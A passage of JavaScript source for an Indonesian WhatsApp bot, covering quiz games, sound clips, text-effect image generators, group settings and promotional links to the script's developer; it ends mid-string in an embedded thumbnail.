if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/siapakahaku.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME SIAPAKAH AKU*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
siapakahaku[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (siapakahaku[from]) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete siapakahaku[from];
}, gamewaktu * 1000)
}
break
case 'caklontong':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (!global.game) return reply(`sedang error kak.`) 
if (from in caklontong) return reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/caklontong.json')));
console.log(`Jawaban : ${jawaban}\n${deskripsi}`)
await reply(`*GAME CAK LONTONG*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
caklontong[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (caklontong[from]) reply(`Waktu habis!\nJawabannya adalah: ${jawaban}\n${deskripsi}`)
delete caklontong[from];
}, gamewaktu * 1000)
}
break
case 'math': case 'kuismath':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (!global.game) return reply(`sedang error kak.`) 
if (from in kuismath) return reply('Masih ada game yang belum diselesaikan!');
let { genMath, modes } = require('./assets/game/math')
if (!q) return reply( `┌─〔 Mode 〕\n├ ${Object.keys(modes).join('\n├ ')}\n└────\ncontoh:\n${prefix}math hard`)
if (!(Object.keys(modes)).includes(args[0])) return reply('Pilih mode yang bener GOBLOK!')
var { soal, jawaban, waktu, hadiah } = await genMath(q.toLowerCase()).catch((err) => m.reply('```Tolong pilih modenya yang benar contoh .math easy```'))
console.log('Jawaban : '+jawaban)
await reply(`*GAME KUIS MATH*\n\nSoal: Berapa hasil dari ${soal.toLowerCase()}\nWaktu: ${waktu / 1000} detik`)
kuismath[from] = {
soal: soal,
jawaban: jawaban,
hadiah: randomNomor(2000, hadiah),
waktu: setTimeout(function () {
if (kuismath[from]) reply(`Waktu habis!\nJawabannya adalah: ${jawaban}`)
delete kuismath[from];
}, waktu)
}
break
case 'family100': case 'f100':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/family100.json')));
console.log('Jawaban : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family100[from] = {
soal: soal,
jawaban: famil,
hadiah: randomNomor(10, 20),
waktu: setTimeout(async function () {
if (from in family100) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
let jwb = family100[from].jawaban
for (let i of jwb){teks += `\n${i}`}
reply(teks)
delete family100[from];
};
}, gamewaktu * 1000)
}

break //Powered By hutao

case 'sekerip': case 'sc': case 'script':{
//if (!isRegistered) return registerbut(noregis)
const ownedr = "6287875411618@s.whatsapp.net"
let u = `*\`</> 乂INPO SCRIPT乂 </>\`*\n
> _script ini free_
t.me/caywzzneh
\n> Hutao md ${version}\n${readmore} *@${ownedr.split("@")[0]}*`
let dits = ``
let mmm = ``
let info = `${monospace(mmm)}`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363357312070270@newsletter',
			newsletterName: 'Hutao Script', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: cay.decodeJid(cay.user.id) },
	forwardingScore: 256,
 externalAdReply: { 
 title: 'Hutao script', 
 thumbnailUrl: 'https://files.catbox.moe/so0zbk.jpg', 
 sourceUrl: 'https://t.me/caywzzneh',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ``,
 }), 
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [ 
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: ppuser } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Dev Script💥\",\"url\":\"https:/wa.me/6287875411618\",\"merchant_url\":\"https:/wa.me/6287875411618\"}`
}, 
{ 
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Group Creator ⚡\",\"url\":\"${global.gc}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{ 
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"script nya disini\",\"url\":\"https://t.me/caywzzneh\",\"merchant_url\":\"https://www.google.com\"}`
}
 ]
 })
 }
 ]
 })
 })
 }
 }
}, { userJid: m.chat, quoted: qtext2 })
cay.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

}
break

case "twt": {
if (!text) return m.reply("Masukan teksnya!")
try {
 ppser = await cay.profilePictureUrl(m.sender, 'image');
} catch (e) {
 ppser = 'https://telegra.ph/file/68d47ac90bcc8ef1510fa.jpg';
}
let { data } = await axios.post('https://ruloaooa-swgen.hf.space/generate2', {
 avatar: ppser,
 username: m.pushName,
 text: text,
 countLike: (Math.floor(Math.random() * 10000))
}, { responseType: 'arraybuffer' })
cay.sendMessage(m.chat, { image: data })
}
break

/*case 'antisticker': case 'antistiker':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator&&!isPremium) return reply(msg.prem)
if (args[0] == 'on'){
if (global.antisticker) return reply('UDAH ON!')
global.antisticker = true
reply('Fitur antisticker telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antisticker) return reply('UDAH OFF!')
global.antisticker = false
reply('Fitur antisticker telah di matikan')
} else reply('on / off')
break*/

/*case "antistiker": case "antisticker": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.owner)
if (!args[0]) return m.reply(example("on/off\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antistiker.includes(m.chat)) return m.reply("*Antistiker* Di Grup Ini Sudah Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
if (antistiker.includes(m.chat)) {
let posi = antilink.indexOf(m.chat)
antistiker.splice(posi, 1)
await fs.writeFileSync("./all/database/antistiker.json", JSON.stringify(antistiker))
}
antistiker.push(m.chat)
await fs.writeFileSync("./all/database/antistiker.json", JSON.stringify(antistiker))
m.reply("Berhasil Menyalakan *antistiker* Di Grup Ini ✅\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antistiker.includes(m.chat)) return m.reply("*antistiker* Di Grup Ini Belum Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
let posi = antistiker.indexOf(m.chat)
antistiker.splice(posi, 1)
await fs.writeFileSync("./all/database/antistiker.json", JSON.stringify(antistiker))
m.reply("Berhasil Mematikan *antistiker* Di Grup Ini ❌\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Inii")
} else {
return m.reply(example("on/off"))
}}
break*/

/*case "welcome": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.admin)
if (!text) {
let teksnya = `Silahkan Pilih Tombol Options Settingan Grup Di Bawah Ini`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© Powered By ${namabot}`
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "Welcome Options || Status : ${welcome.includes(m.chat) ? "Aktif ✅" : "Tidak Aktif ❌"}",
rows: [{ title: "ON Welcome", description: "Pilih Opsi Ini Untuk Mengaktifkan Welcome", id: ".welcome on" }, 
{ title: "OFF Welcome", description: "Pilih Opsi Ini Untuk Mematikan Welcome", id: ".welcome off" }]
}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext2}) 
await cay.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
if (text == "on") {
if (welcome.includes(m.chat)) return reply("Welcome Di Grup Ini Sudah Aktif")
await welcome.push(m.chat)
await fs.writeFileSync("./all/database/welcome.json", JSON.stringify(welcome))
let teksnya = `*Welcome Berhasil Diaktifkan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Grup*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext2}) 
await cay.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
} else if (text == "off") {
if (!welcome.includes(m.chat)) return reply("Grup Ini Tidak Terdaftar Di Database Welcome")
let posi = welcome.indexOf(m.chat)
await welcome.splice(posi, 1)
await fs.writeFileSync("./all/database/welcome.json", JSON.stringify(welcome))
let teksnya = `*Welcome Berhasil Dimatikan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Grup*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext2}) 
await cay.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
}
break*/
        // AMPUN 
        case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'Sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
var resttt = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 cay.sendMessage(m.chat, { audio: resttt, mimetype: 'audio/mp4', ptt: true, 
})
break   
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':
{
if (!text) return reply(`Example : ${prefix+command} +`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, text)
cay.sendMessage(m.chat, { image: { url: haldwhd }, caption: `Done` }, { quoted: m })
}
break
case 'shadow':
case 'write':
case 'romantic':
case 'burnpaper':
case 'smoke':
case 'narutobanner':
case 'love':
case 'undergrass':
case 'doublelove':
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':
{
if (!text) return reply(`Example : ${prefix + command} ${global.botname}`);
reply("sabar..")
let link;
if (/stonetext/.test(command))
link =
  'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html';
if (/writeart/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html';
if (/summertext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html';
if (/wolfmetaltext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html';
if (/nature3dtext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html';
if (/rosestext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html';
if (/naturetypography/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html';
if (/quotesunder/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html';
if (/shinetext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html';
if (/shadow/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html';
if (/write/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html';
if (/romantic/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html';
if (/burnpaper/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html';
if (/smoke/.test(command))
link =
  'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html';
if (/narutobanner/.test(command))
link =
  'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html';
if (/love/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html';
if (/undergrass/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html';
if (/doublelove/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html';
if (/coffecup/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html';
if (/underwaterocean/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html';
if (/smokyneon/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html';
if (/starstext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html';
if (/rainboweffect/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html';
if (/balloontext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html';
if (/metalliceffect/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html';
if (/embroiderytext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html';
if (/flamingtext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
let dehe = await photoOxy(link, text);
cay.sendMessage(
m.chat,
{ image: { url: dehe }, caption: `Done`},
{ quoted: m }
);
}
break
case "antistiker": case "antisticker":{
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.admin)
if (!text) {
let teksnya = `Silahkan Pilih Tombol Options Settingan Grup Di Bawah Ini`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© Powered By ${namabot}`
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "Welcome Options || Status : ${welcome.includes(m.chat) ? "Aktif ✅" : "Tidak Aktif ❌"}",
rows: [{ title: "ON Welcome", description: "Pilih Opsi Ini Untuk Mengaktifkan Welcome", id: ".welcome on" }, 
{ title: "OFF Welcome", description: "Pilih Opsi Ini Untuk Mematikan Welcome", id: ".welcome off" }]
}]}`*/
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext2}) 
await cay.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
if (text == "on") {
if (antistiker.includes(m.chat)) return reply("antistiker Di Grup Ini Sudah Aktif")
await antistiker.push(m.chat)
await fs.writeFileSync("./all/database/antistiker.json", JSON.stringify(antistiker))
let teksnya = `*antistiker Berhasil Diaktifkan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Grup*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}" */
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext2}) 
await cay.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
} else if (text == "off") {
if (!antistiker.includes(m.chat)) return reply("Grup Ini Tidak Terdaftar Di Database antistiker")
let posi = antistiker.indexOf(m.chat)
await antistiker.splice(posi, 1)
await fs.writeFileSync("./all/database/antistiker.json", JSON.stringify(antistiker))
let teksnya = `*antistiker Berhasil Dimatikan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Grup*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}" */
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext2}) 
await cay.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
}
break
case 'gcbot': case 'gchutao':{
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "120363286622038074@g.us",
"inviteCode": "sfeVFOlWvlo5Hd9x",
"inviteExpiration": "166659839399999",
	"groupName": "ꪖd̸ịt̶s͟.md",
	"previewType": "PHOTO",
"renderLargerThumbnail": true,
	"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAEAAgIDAQAAAAAAAAAAAAAABQcDBgEECAL/xAA2EAABAwMBBQYFAwMFAAAAAAABAAIDBAURBgcUITGREkFRUmFxEzKBscEiodEjM0MXJGKC8f/EABoBAQEBAQEBAQAAAAAAAAAAAAAFBgIBBAP/xAAvEQABAwIDBQcEAwAAAAAAAAAAAQIDBAUREyESFDFBUSIygaGxwfBCcdHhFWGR/9oADAMBAAIRAxEAPwD1SiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIThAEXHaC5yEAREQBERAEREAREQBERAEREAREQA8lpW0HV0mn3U8FJEySokBcS7k0Bbm7iqN2o1Px9VytB4RRtZ9z+VRtVM2pqUY9MU1Vfn3J9zqHU9OrmLgpl/wBSr09xLY6ZoBxwaeP7ru0O0y5Cpj3ungfDkBwZkHHoq8i4Pkb656rItUtppHNVNhPP8mc/kqpFx2/Q9O08rZ4GSs+V7Q4fVZFA6JqTV